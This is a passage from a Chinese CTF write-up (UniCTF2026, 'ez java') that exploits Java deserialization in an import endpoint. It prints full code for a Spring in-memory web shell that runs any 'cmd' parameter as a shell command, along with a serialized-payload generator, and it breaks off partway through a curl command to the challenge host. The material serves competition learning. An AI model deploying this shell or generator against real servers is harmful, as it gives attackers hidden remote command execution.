}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">OneSword</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>3</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/02/"><span class="card-archive-list-date">二月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/01/"><span class="card-archive-list-date">一月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/" itemprop="url">wp</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/wp/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>wp</span></a></span></div></div><h1 class="post-title" itemprop="name headline">UniCTF2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-02-03T18:23:22.619Z" title="发表于 2026-02-04 02:23:22">2026-02-04</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-02-03T18:34:00.979Z" title="更新于 2026-02-04 02:34:00">2026-02-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">26.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>139分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="UniCTF2026"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为衡阳"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>衡阳</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5YWQ3YWZmZTY1MjYzNjcyMTc2OTMyYWZmMWRhYTVfSkk4ek1ORHBBcUVzUlJtek45eklmR3o0bXd0NjhiZnBfVG9rZW46UWtLVGJiaG1Zb3BLbnN4SUhyNWM3VzRnbldoXzE3NzAxNDM1OTE6MTc3MDE0NzE5MV9WNA"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://onesword-xt.github.io/posts/UniCTF2026.html"><header><a class="post-meta-categories" href="/categories/wp/" itemprop="url">wp</a><a href="/tags/wp/" tabindex="-1" itemprop="url">wp</a><h1 id="CrawlerTitle" itemprop="name headline">UniCTF2026</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Onesword</span><time itemprop="dateCreated datePublished" datetime="2026-02-03T18:23:22.619Z" title="发表于 2026-02-04 02:23:22">2026-02-04</time><time itemprop="dateCreated datePublished" datetime="2026-02-03T18:34:00.979Z" title="更新于 2026-02-04 02:34:00">2026-02-04</time></header><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ez-java"><a href="#ez-java" class="headerlink" title="ez java"></a>ez java</h3><p>给了上传配置的接口 <code>/api/user/settings/import</code>  POST传参 configData</p>
<p>反编译 分析 Jar 包中的 <code>UserProfileController.class</code> 和 <code>ConfigDataWrapper.class</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NmUwMWRmYWRjODEwZTMzNWQyZjMxNDlmMjYyMTE5MjhfZUg1WDBRU0Y1NTBIN2ZBSHRzNGk4VldFU1l3VWF0R3FfVG9rZW46WUkyYmJaQkh6b05ycGR4ck11M2NKVFRRbjBXXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzA3NGMxMzU5ZTM2ZTUzZTUzMjgwY2YwODNhZjg5NThfeG1XdkNCU21wbmdvT2lzQ0tBVmFpaUlBcGdHbjBtNElfVG9rZW46TE1FaGJVRzVJb05lR0R4UlhVa2NuNUZxbm4xXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ois.readUTF()` 必须是 `&quot;InternalManager&quot;`，`ois.readInt()` 必须是 `2025</span><br></pre></td></tr></table></figure>

<p>通过 <code>ois.readObject()</code> 还原对象。</p>
<p><strong>触发点</strong>：<code>logger.info</code> 触发了 <code>ConfigDataWrapper.toString()</code>。</p>
<p><code>toString()</code> 中会对 <code>ClassByte</code> 字段进行异或解密，然后调用 <code>defineClass</code> 加载类并实例化（<code>newInstance</code>），从而执行恶意代码。</p>
<p>ProxyShell.java(内存马)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class ProxyShell implements InvocationHandler &#123;</span><br><span class="line"></span><br><span class="line">    public ProxyShell() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            ClassLoader loader = Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; holder = loader.loadClass(&quot;org.springframework.web.context.request.RequestContextHolder&quot;);</span><br><span class="line">            Object attr = holder.getMethod(&quot;currentRequestAttributes&quot;).invoke(null);</span><br><span class="line">            Method getAttr = attr.getClass().getMethod(&quot;getAttribute&quot;, String.class, int.class);</span><br><span class="line">            Object wac = getAttr.invoke(attr, &quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">            Method getBean = wac.getClass().getMethod(&quot;getBean&quot;, Class.class);</span><br><span class="line">            Class&lt;?&gt; mappingClass = loader.loadClass(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);</span><br><span class="line">            Object mapping = getBean.invoke(wac, mappingClass);</span><br><span class="line"></span><br><span class="line">            Field field = null;</span><br><span class="line">            Class&lt;?&gt; current = mapping.getClass();</span><br><span class="line">            while(current != Object.class) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    field = current.getDeclaredField(&quot;adaptedInterceptors&quot;);</span><br><span class="line">                    break;</span><br><span class="line">                &#125; catch (NoSuchFieldException e) &#123;</span><br><span class="line">                    current = current.getSuperclass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (field != null) &#123;</span><br><span class="line">                field.setAccessible(true);</span><br><span class="line">                List&lt;Object&gt; list = (List&lt;Object&gt;) field.get(mapping);</span><br><span class="line"></span><br><span class="line">                Class&lt;?&gt; interceptorClass = loader.loadClass(&quot;org.springframework.web.servlet.HandlerInterceptor&quot;);</span><br><span class="line">                Object dynamicProxy = Proxy.newProxyInstance(loader, new Class[]&#123;interceptorClass&#125;, this);</span><br><span class="line"></span><br><span class="line">                list.add(0, dynamicProxy);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        String methodName = method.getName();</span><br><span class="line"></span><br><span class="line">        if (&quot;preHandle&quot;.equals(methodName)) &#123;</span><br><span class="line">            Object request = args[0];</span><br><span class="line">            Object response = args[1];</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Method getParam = request.getClass().getMethod(&quot;getParameter&quot;, String.class);</span><br><span class="line">                String cmd = (String) getParam.invoke(request, &quot;cmd&quot;);</span><br><span class="line"></span><br><span class="line">                if (cmd != null &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                    Method getWriter = response.getClass().getMethod(&quot;getWriter&quot;);</span><br><span class="line">                    Object writer = getWriter.invoke(response);</span><br><span class="line"></span><br><span class="line">                    String[] execCmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)</span><br><span class="line">                            ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;</span><br><span class="line">                            : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line"></span><br><span class="line">                    Process p = Runtime.getRuntime().exec(execCmd);</span><br><span class="line">                    Scanner s = new Scanner(p.getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                    String output = s.hasNext() ? s.next() : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">                    Method write = writer.getClass().getMethod(&quot;write&quot;, String.class);</span><br><span class="line">                    write.invoke(writer, output);</span><br><span class="line">                    Method flush = writer.getClass().getMethod(&quot;flush&quot;);</span><br><span class="line">                    flush.invoke(writer);</span><br><span class="line"></span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>javac -source 8 -target 8 ProxyShell.java   编译 编写 <code>ExpGen.java</code> 生成器，模拟服务端的 <code>ConfigDataWrapper</code> 结构（注意包名一致 <code>com.unictf.ctf.tools</code>）</p>
<p><code>com/unictf/ctf/tools/ConfigDataWrapper.java</code> (伪造结构)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.unictf.ctf.tools; <span class="comment">// ⚠️ 包名必须正确</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigDataWrapper</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">// 必须和题目中的 serialVersionUID 一致</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6623142231L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String configId;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; metadata;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> lastModified;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> checksum;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line">    <span class="keyword">private</span> String sign;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该类主要用于承载数据，无需额外方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ExpGen.java</code> (生成器)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpGen</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=== 正在生成 Payload ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 自动寻找编译好的 Exploit.class 文件</span></span><br><span class="line">        <span class="comment">// IDEA 默认编译输出路径在 out/production/项目名/ 下，或者同目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">classFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;C:\\Users\\csdd\\Desktop\\截取的线索(1)\\ctf\\src\\ProxyShell.class&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果当前目录没有，尝试去 target 或 out 目录找（适配 IDEA 运行环境）</span></span><br><span class="line">        <span class="keyword">if</span> (!classFile.exists()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> ExpGen.class.getResource(<span class="string">&quot;/&quot;</span>).getPath() + <span class="string">&quot;Exploit.class&quot;</span>;</span><br><span class="line">            classFile = <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!classFile.exists()) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;❌ 错误：找不到 Exploit.class！\n请先点击 IDEA 菜单 Build -&gt; Build Project 编译项目。&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;✅ 读取恶意类文件: &quot;</span> + classFile.getAbsolutePath());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 读取字节码并加密 (XOR 255)</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(classFile.toPath());</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; code.length; i++) &#123;</span><br><span class="line">            code[i] = (<span class="type">byte</span>) (code[i] ^ <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 反射构造 ConfigDataWrapper 对象</span></span><br><span class="line">        <span class="type">ConfigDataWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigDataWrapper</span>();</span><br><span class="line">        setField(wrapper, <span class="string">&quot;configId&quot;</span>, <span class="string">&quot;CONF-CTF-EXP&quot;</span>);</span><br><span class="line">        setField(wrapper, <span class="string">&quot;sign&quot;</span>, <span class="string">&quot;ready&quot;</span>);      <span class="comment">// 必须是 ready 才能触发解密执行</span></span><br><span class="line">        setField(wrapper, <span class="string">&quot;ClassByte&quot;</span>, code);    <span class="comment">// 放入加密后的恶意代码</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 序列化流程 (添加 Controller 要求的协议头)</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// --- 关键协议头 ---</span></span><br><span class="line">        oos.writeUTF(<span class="string">&quot;InternalManager&quot;</span>); <span class="comment">// Controller: ois.readUTF()</span></span><br><span class="line">        oos.writeInt(<span class="number">2025</span>);              <span class="comment">// Controller: ois.readInt()</span></span><br><span class="line">        <span class="comment">// ------------------</span></span><br><span class="line"></span><br><span class="line">        oos.writeObject(wrapper);        <span class="comment">// 写入真正的恶意对象</span></span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. Base64 编码输出</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;\n👇 复制下面的 Payload (不要包含换行) 👇&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;=================================================================================&quot;</span>);</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        System.out.println(<span class="string">&quot;=================================================================================&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反射工具方法：用于给 private 字段赋值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MGIxYTE1MzBjOGNkMGMyNWJiM2ZjMGM0MjM2YjEwYjdfSHo5RXIxNDZZc0twejlOVDFzMGFMY1VIWEkwNUVPek1fVG9rZW46QktrSmJ6c3phb0ZvSDl4RGp2eGNqVjhlbkFDXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>Payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST &quot;http://8888-e0acd2b9-8c3e-4aca-a8b5-a4e3d7b68201.challenge.ctfplus.cn/api/user/settings/import&quot; --data-urlencode 